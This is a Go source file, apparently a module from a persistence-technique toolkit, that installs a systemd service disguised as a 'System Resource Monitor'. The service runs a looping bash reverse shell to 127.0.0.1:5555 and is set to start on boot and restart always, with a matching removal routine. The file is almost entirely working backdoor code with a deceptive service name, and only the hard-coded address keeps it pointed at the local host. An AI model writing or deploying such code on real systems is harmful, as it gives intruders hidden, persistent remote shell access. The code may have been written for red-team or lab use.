//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type SystemdService struct {
	serviceName string
}

func NewSystemdService() Technique {
	return &SystemdService{
		serviceName: "system-monitor",
	}
}

func (s *SystemdService) Name() string {
	return "Systemd Service"
}

func (s *SystemdService) Description() string {
	return "Persistent systemd service with reverse shell"
}

func (s *SystemdService) StealthLevel() string {
	return "medium"
}

func (s *SystemdService) SurvivesReboot() bool {
	return true
}

func (s *SystemdService) Install() error {
	// Create service script
	scriptPath := fmt.Sprintf("/usr/local/bin/%s", s.serviceName)
	script := `#!/bin/bash
while true; do
    bash -i >& /dev/tcp/127.0.0.1/5555 0>&1 2>/dev/null || sleep 60
done
`
	
	if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
		return fmt.Errorf("create service script: %w", err)
	}
	
	// Create systemd service unit
	servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", s.serviceName)
	serviceUnit := fmt.Sprintf(`[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
`, scriptPath)
	
	if err := os.WriteFile(servicePath, []byte(serviceUnit), 0644); err != nil {
		return fmt.Errorf("create service unit: %w", err)
	}
	
	// Reload systemd and enable service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", s.serviceName).Run()
	exec.Command("systemctl", "start", s.serviceName).Run()
	
	return nil
}

func (s *SystemdService) Remove() error {
	exec.Command("systemctl", "stop", s.serviceName).Run()
	exec.Command("systemctl", "disable", s.serviceName).Run()
	
	os.Remove(fmt.Sprintf("/etc/systemd/system/%s.service", s.serviceName))
	os.Remove(fmt.Sprintf("/usr/local/bin/%s", s.serviceName))
	
	exec.Command("systemctl", "daemon-reload").Run()
	
	return nil
}

func (s *SystemdService) Details() string {
	return fmt.Sprintf(`Systemd service created: %s.service
Location: /etc/systemd/system/%s.service
Script: /usr/local/bin/%s

Service is enabled and will start on boot.
Connects to: 127.0.0.1:5555

Check status: systemctl status %s
`, s.serviceName, s.serviceName, s.serviceName, s.serviceName)
}
